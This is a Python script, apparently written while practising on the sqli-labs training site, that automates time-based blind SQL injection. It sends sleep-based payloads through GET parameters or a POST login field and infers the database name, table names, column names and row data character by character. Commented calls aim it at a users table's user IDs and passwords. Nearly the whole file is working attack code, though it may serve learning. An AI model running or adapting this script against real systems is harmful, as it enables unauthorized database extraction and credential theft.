# coding:utf-8
import requests
import datetime
import time


# 获取数据库名长度
# url = "http://192.168.10.149/sqlit/Less-15/"

# 时间注入模块


def database_name(url,urlpayload=""):
    name = ''
    for j in range(1, 9):
        # i要尝试什么
        for i in '0123456789abcdefghijklmnopqrstuvwxyz':
            payload = "and if(substr(database(),%d,1)='%s',sleep(3),1) -- a" % (j, i)
            time1 = datetime.datetime.now()
            if(urlpayload!=""):
                # 这个是我们用户如果说不是post，那么代码中不传urlpayload参数，否则传，以此判断是否是post注入
                pay={"uname":"admin"+urlpayload+payload,"passwd":"admin"}
                # print("this=>"+urlpayload+payload)
                # 发送Post请求
                requests.post(url,pay)
            else:

                requests.get(url + payload)
            time2 = datetime.datetime.now()
            # 结束时间减去开始时间得到时间差
            sec = (time2 - time1).seconds
            # 如果时间差比2大，说明什么？说明我们这个字符是正确的
            if sec >= 2:
                name += i
                print(name)
                break
    print(name)
    return name
# 下同

def table_name(url,database,urlpayload=""):
    name = ''
    for z in range(0, 9):
        for i in range(1, 9):
            for j in '0123456789abcdefghijklmnopqrstuvwxyz':
                payload = "and if(substr((select table_name from information_schema.tables " \
                          "where table_schema='%s' limit %d,1),%d,1)='%s',sleep(3),1) -- a" % (database,z, i, j)

                time1 = datetime.datetime.now()
                if (urlpayload != ""):
                    pay = {"uname": "admin" + urlpayload + payload, "passwd": "admin"}
                    requests.post(url, pay)
                else:
                    requests.get(url + payload)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 2:
                    name += j
                    print(name)
                    break
        print( name)
        name += ' '
    # print('database_name:', name)


def column_name(url,table_name,urlpayload=""):
    name = ''
    for z in range(0, 15):
        for i in range(1, 12):
            for j in '0123456789abcdefghijklmnopqrstuvwxyz':

                payload = "and if(substr((select column_name from information_schema.columns " \
                          "where table_name='%s' limit %d,1),%d,1)='%s',sleep(3),1) -- a" % (table_name,z, i, j)
                time1 = datetime.datetime.now()
                if (urlpayload != ""):
                    pay = {"uname": "admin" + urlpayload + payload, "passwd": "admin"}
                    requests.post(url, pay)
                else:
                    requests.get(url + payload)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 2:
                    name += j
                    print(name)
                    break
        print( name)
        name += ','


def list_data(url,database,table_name,coluname,urlpayload=""):
    name = ''
    for i in range(1, 100):
        for j in '0123456789abcdefghijklmnopqrstuvwxyz#,@-+=)(*&*/.!+':

            payload = "and if(substr((select group_concat(%s) from %s.%s " \
                      "),%d,1)='%s',sleep(3),1) -- a" % (coluname,database,table_name,i, j)
            time1 = datetime.datetime.now()
            if (urlpayload != ""):
                pay={"uname":"admin"+urlpayload+payload,"passwd":"admin"}
                requests.post(url, pay)
            else:
                requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 2:
                name += j
                print(name)
                break
    print( name)
    name += ','


# if __name__ == '__main__':
#     pass
    # database_name(url)
    # database_len()
    # table_name()
    # column_name(url,"users")
    # list_data(url,"security","users","userid,password")